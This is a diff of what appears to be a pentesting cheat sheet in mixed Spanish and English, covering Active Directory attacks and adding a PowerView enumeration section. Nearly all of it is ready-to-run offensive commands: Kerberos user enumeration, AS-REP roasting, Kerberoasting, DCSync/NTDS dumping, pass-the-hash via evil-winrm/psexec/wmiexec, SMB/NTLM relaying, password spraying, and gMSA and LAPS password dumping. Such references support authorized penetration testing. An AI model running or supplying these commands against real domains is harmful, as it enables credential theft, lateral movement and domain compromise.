@@ -715,24 +715,24 @@ Comandos útiles
 
 [Hacktricks MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
 
-## Active Directory (AD)
+# Active Directory (AD)
 
-### Kerberos user enumeration
+Kerberos user enumeration
 
 ```
 kerbrute userenum -d domain.local users.txt --dc IP
 ```
-### ASREPRoasting
+ASREPRoasting
 
 ```
 GetNPUsers.py domain.local/user -usersfile users.txt
 ```
-### Kerberoasting
+Kerberoasting
 
 ```
 GetUserSPNs.py DC-IP\user:password
 ```
-### DRSUAPI (DCSync/NTDS Dumping)
+DRSUAPI (DCSync/NTDS Dumping)
 
 ```
 secretsdump.py domain.local/USER:PASSWORD@IP
@@ -740,7 +740,7 @@ secretsdump.py domain.local/USER:PASSWORD@IP
 ```
 crackmapexec smb network/address -u users -p passwords --ntds vss
 ```
-### Pass the hash
+Pass the hash
 
 ```
 evil-winrm -i IP -u user -H 'NTHash'
@@ -751,45 +751,44 @@ psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
 ```
 wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
 ```
-### SMB Relay
+SMB Relay
 
 ```
 responder -I  NETINTERFACE -dw
 ```
-### NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without 'c' flag)]
+NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without 'c' flag)]
 
 ```
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 ```
-### Domain Host Discovery
+Domain Host Discovery
 
 ```
 crackmapexec smb network/address
 ```
-### User & Password Spraying
+User & Password Spraying
 
 ```
 crackmapexec smb network/address -u users -p passwords
 ```
-### Userenum with RPC (-N para Null Session)
+## Post Explotation
+
+Userenum with RPC (-N para Null Session)
 
 ```
 rpcclient -U 'domain.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
 ```
-### Descripcion usuarios with RPC
+Descripcion usuarios with RPC
 
 ```
 for rid in $(rpcclient -U 'dominio.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'| tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n";  rpcclient -U 'dominio.local\user%password' IP -c "queryuser $rid" | grep -E -i "user name|description" ;done
 ```
-### Usuarios del AD (ADWS)
-```
-Get-ADUser -Filter * | select name
-```
-### Read GMSA Password
+
+Read GMSA Password
 ```
 python3 gMSADumper.py -u 'user' -p 'password' -l IP -d domain.local 
 ```
-### Read [LAPS](https://github.com/n00py/LAPSDumper)
+Read [LAPS](https://github.com/n00py/LAPSDumper)
 ```
 python3 laps.py -u 'user' -p 'password' -l IP -d domain.local
 ```
@@ -823,6 +822,92 @@ service apache2 start
 ```
 ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
 ```
+
+### PowerView
+
+Domain Info
+```
+Get-NetDomain
+```
+Domain Controller Info
+```
+Get-NetDomainController
+```
+
+Policies in the Domain
+```
+Get-DomainPolicy
+```
+
+Passwords Policy
+```
+(Get-DomainPolicy).SystemAccess
+```
+
+Users enum
+
+```
+Get-NetUser | select cn
+```
+
+Users description
+```
+Get-NetUser | select description
+```
+
+Groups enum
+
+```
+Get-NetGroup | select name
+```
+
+Groups where admin are involved
+
+```
+Get-NetGroup *admin* | select name
+```
+
+Users of a group
+```
+Get-NetGroupMember "Domain Admins"
+```
+Kerberoasting users
+
+```
+Get-DomainUser -SPN | select name
+```
+
+Kerberos info (Golden Tickets)
+```
+(Get-DomainPolicy -Policy Domain).KerberosPolicy
+```
+
+Computers enum
+
+```
+Get-NetComputer | select name
+```
+
+Computers OS
+```
+Get-NetComputer | select OperatingSystem
+```
+
+Look for shares
+```
+Invoke-ShareFinder
+```
+
+Get GPOs
+```
+Get-NetGPO | select displayname
+```
+
+Usuarios del AD (ADWS)
+```
+Get-ADUser -Filter * | select name
+```
+
 ## Privilege Escalation
 
 ### SeImpersonatePrivilege (JuicyPotato.exe)
